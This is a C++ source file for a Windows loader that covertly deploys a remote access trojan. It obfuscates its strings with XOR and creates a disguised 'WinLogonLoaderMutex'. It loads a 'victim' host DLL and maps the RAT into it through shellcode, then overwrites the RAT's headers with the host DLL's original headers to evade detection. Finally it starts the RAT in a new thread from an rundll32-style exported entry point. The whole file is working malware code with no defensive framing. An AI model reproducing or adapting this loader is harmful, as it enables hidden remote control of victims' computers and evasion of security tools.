#include "loader.hpp"

wchar_t pwd[MAX_PATH]{};
wchar_t* log_path = nullptr;
unsigned char key[16]{ 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P' }; // change for prod or get from cmake

int is_only_instance() {
    HMODULE ntdll = GetModuleHandleW(XOR_WIDE_LIT(L"NTDLL"));
    if (!ntdll) {
        return 1;
    }

    auto create_mutant = reinterpret_cast<decltype(&NtCreateMutant)>(GetProcAddress(
        ntdll,
        XOR_LIT("NtCreateMutant")
    ));
    if (!create_mutant) {
        return 1;
    }

    auto init_unicode_string = reinterpret_cast<decltype(&RtlInitUnicodeString)>(GetProcAddress(
        ntdll,
        XOR_LIT("RtlInitUnicodeString")
    ));
    if (!init_unicode_string) {
        return 1;
    }

    NTSTATUS status;
    UNICODE_STRING mutant_name;
    OBJECT_ATTRIBUTES attrs;
    HANDLE handle;
    PCWSTR mutant_name_nt = XOR_WIDE_LIT(L"\\??\\WinLogonLoaderMutex");

    init_unicode_string(&mutant_name, mutant_name_nt);

    InitializeObjectAttributes(&attrs, &mutant_name, 0, nullptr, nullptr);

    if (NT_ERROR(status = create_mutant(&handle, MUTANT_ALL_ACCESS, &attrs, true))) {
        return 1;
    }

    else if (status == STATUS_OBJECT_NAME_COLLISION || status == STATUS_OBJECT_NAME_EXISTS) {
        return 2;
    }

    return 0;
}

int load() {
    // load library for victim dll, uninitialized
    HMODULE hmod = LoadLibraryExW(XOR_WIDE_LIT(LR"()" RAT_HOST_DLL), nullptr, DONT_RESOLVE_DLL_REFERENCES);

    auto status = loader_main();
    if (!status.has_value()) {
        common::log_error(XOR_WIDE_LIT(L"Encountered error in loader_main"));
        return 4;
    }

    if (error::SUCCESS != g_shellcode_result.err) {
        return 5;
    }

    // Overwrite RAT headers with original host DLL's
    std::copy_n(
        g_shellcode_result.og_headers,
        g_shellcode_result.og_headers_size,
        g_shellcode_result.module_base
    );

    // Set headers to readonly
    unsigned long old;
    VirtualProtect(
        g_shellcode_result.module_base,
        g_shellcode_result.og_headers_size,
        PAGE_READONLY,
        &old
    );

    std::fill_n(
        reinterpret_cast<unsigned char*>(g_shellcode_result.og_headers),
        g_shellcode_result.og_headers_size,
        0
    );

    VirtualFree(g_shellcode_result.og_headers, 0, MEM_RELEASE);

    if (error::SUCCESS == g_shellcode_result.err) {
        //call rat dllmain to initialize from g_shellcode_result struct
        bool dllmain_result = g_shellcode_result.dll_main(hmod, DLL_PROCESS_ATTACH, nullptr);
        if (!dllmain_result) {
            common::log_error(XOR_WIDE_LIT(L"Encountered error when attempting to initialize rat dll"));
            return 6;
        }

        HANDLE hRat = CreateThread(
            nullptr,
            0,
            reinterpret_cast<PTHREAD_START_ROUTINE>(g_shellcode_result.func),
            nullptr,
            0,
            nullptr
        );
        if (hRat == INVALID_HANDLE_VALUE || hRat == NULL) {
            common::log_error(XOR_WIDE_LIT(L"Encountered error when attempting create rat dll thread"));
            return 7;
        }
    }

    return 0;
}

extern "C" __declspec(dllexport)
void CALLBACK entry_point(HWND, HINSTANCE, char*, int) {
    int ret = is_only_instance();
    if (ret != 0) {
        return;
    }
    
    // Logs
    GetCurrentDirectoryW(MAX_PATH, pwd);
    log_path = wcscat(pwd, XOR_WIDE_LIT(L"\\loader_log.txt"));
    if (common::initialize_logger(log_path, key, 16) != 0) {
        return;
    }
    common::log_info(XOR_WIDE_LIT(L"Initialization complete."));
    load();
    while (true) { Sleep(30); }
}